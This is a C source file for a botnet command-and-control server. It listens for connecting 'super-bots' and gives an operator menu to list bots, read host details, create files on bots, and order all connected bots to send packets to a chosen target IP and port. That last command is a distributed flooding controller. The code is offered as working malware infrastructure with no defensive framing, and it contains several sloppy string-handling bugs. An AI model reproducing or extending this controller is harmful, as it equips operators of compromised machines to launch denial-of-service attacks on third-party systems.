#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/poll.h>
#include <pthread.h>

#define MAX_SOCKET 100

int server_sockfd, client_sockfd, sockfd;
int state, nread;
socklen_t client_len;
int i,max,dst_port;
unsigned int count = 0;
char id[MAX_SOCKET][2];

char instruction[255];
char ip_addr[255];
char read_bot[255];
char read_option[255];
char bot_number[2];
char create_route[255];
char send_temp[255];
int num_packet;
int superbot_count;

struct sockaddr_in clientaddr, serveraddr;
struct pollfd client[MAX_SOCKET];
pthread_t p_thread;
int thr;

char buf[255];
char message[255];
char message_temp[255];
char *temp;



void error(const char *msg)
{
    perror(msg);
    exit(0);
}
void *shell()
{
    //if(count>5 && count%3 == 0)
    //{
    while(1)
    {
        sleep(1);
        printf("Bot-master #");
        fgets(message,255,stdin);
        if(strlen(message) < 2)
            continue;
        if(strstr(message,"help"))
        {
            printf("/***************MENU***************/\n");
            printf("1) Show bot hierarchy > show\n");
            printf("2) Read (host or date) > read [bot_number] [host/date]\n");
            printf("3) Create file > create [bot_number] [route]\n");
            printf("4) Send packet > send [number of packet] [target IP] [ target Port]\n");
            printf("5) Search bots > search [bot_number]\n");
            printf("6) Help > help\n");
            printf("7) Exit > exit\n");
            printf("/**********************************/\n");
            printf("Examples : \n");
            printf("show\n");
            printf("read 14 host\n");
            printf("create 25 /home/text.txt\n");
            printf("send 30 127.0.0.1 80\n");
            printf("search 37\n");
        }
        if(strstr(message,"exit"))
        {
            printf("Master is shutting down...\n");
            for(i=1;i<MAX_SOCKET;i++)
                close(client[i].fd);
            exit(1);
        }
        strncpy(message_temp,message,sizeof(message_temp));
        temp = strtok(message_temp," ");
        strncpy(instruction,temp,sizeof(temp));
        if(strstr(instruction,"show"))
        {
        }
        else if(strstr(instruction,"read"))
        {
            temp = strtok(NULL," ");
            strncpy(bot_number,temp,2*sizeof(char));
            temp = strtok(NULL," ");
            strncpy(read_option,temp,sizeof(read_option));
        }
        else if(strstr(instruction,"create"))
        {
            temp = strtok(NULL," ");
            if(temp == NULL)
                continue;
            strncpy(bot_number,temp,2*sizeof(char));
        }
        else if(strstr(instruction,"send"))
        {
            memset(send_temp,'\0',255);
            superbot_count = 0;
            temp = strtok(NULL," ");
            if(temp == NULL)
                continue;
            num_packet = atoi(temp);
            temp = strtok(NULL," ");
            strncpy(ip_addr,temp,sizeof(ip_addr));
            temp = strtok(NULL," ");
            dst_port = atoi(temp);
            
            for(i=1;i<MAX_SOCKET;i++)
                if(client[i].fd >= 0)
                    superbot_count++;

            num_packet = num_packet / superbot_count;
            sprintf(send_temp,"send %d %s %d",num_packet,ip_addr,dst_port);
            
            for(i=1;i<MAX_SOCKET;i++)
            {
                if(client[i].fd >= 0)
                {
                    write(client[i].fd,send_temp,sizeof(send_temp));
                }
            }
        }
        else if(strstr(instruction,"search"))
        {
            temp = strtok(NULL," ");
            strncpy(bot_number,temp,2*sizeof(char));
        }
        else
        {
            //printf("Insert correct instruction\n");
        }
        for(i=1;i<MAX_SOCKET;i++)
        {
            if(!strstr(instruction,"send"))
            {
                write(client[i].fd,message,sizeof(message));
            }
        }
 
    }
    //}
}
int main(int argc, char **argv)
{
   state = 0;

   client_len = sizeof(clientaddr);

   if((server_sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
       error("socket error");

   bzero(&serveraddr, sizeof(serveraddr));
   serveraddr.sin_family = AF_INET;
   serveraddr.sin_addr.s_addr = htonl(INADDR_ANY);
   serveraddr.sin_port = htons(60000);

   state = bind(server_sockfd, (struct sockaddr *)&serveraddr, sizeof(serveraddr));

   if(state == -1)
       error("bind error");

   state = listen(server_sockfd, 10);
   if(state == -1)
       error("listen error");

   //poll start

   client[0].fd = server_sockfd;
   client[0].events = POLLIN;
   for(i=1;i<MAX_SOCKET;i++)
   {
       client[i].fd = -1;
   }
   max = 0;

   printf("/***************MENU***************/\n");
   printf("1) Show bot hierarchy > show\n");
   printf("2) Read (host or date) > read [bot_number] [host/date]\n");
   printf("3) Create file > create [bot_number] [route]\n");
   printf("4) Send packet > send [number of packet] [target IP] [ target Port]\n");
   printf("5) Search bots > search [bot_number]\n");
   printf("6) Help > help\n");
   printf("7) Exit > exit\n");
   printf("/**********************************/\n");

   thr = pthread_create(&p_thread,NULL,shell,NULL);

   while(1)
   {
       count++;
       nread = poll(client, max+i, 1000);

       memset(message,'\0',255);
       memset(message_temp,'\0',255);
       

       if(client[0].revents & POLLIN)
       {
           client_sockfd = accept(server_sockfd,(struct sockaddr *)&clientaddr,&client_len);
           for(i=1;i<MAX_SOCKET;i++)
           {
               if(client[i].fd < 0)
               {
                   client[i].fd = client_sockfd;
                   client[i].events = POLLIN;
                   read(client[i].fd,id[i],2);
                   printf("\nSuper-bot %c%c is connected.\n",id[i][0],id[i][1]);
                   break;
               }
           }

           if(i > max)
               max = i;

           if(--nread <= 0)
               continue;
       }

       
       for(i=1;i<=max;i++)
       {
           if((sockfd = client[i].fd) < 0)
               continue;
           if(client[i].revents & (POLLIN | POLLERR))
           {
               memset(buf,'\0',255);
               if(read(sockfd,buf,255) <= 0)
               {
                   printf("\nSuper-bot %c%c is disconnected.\n",id[i][0],id[i][1]);
                   close(client[i].fd);
                   client[i].fd = -1;
               }
               else
               {
                   printf("\n%s\n",buf);
               }

           }
       }
   }
   return 0;
}

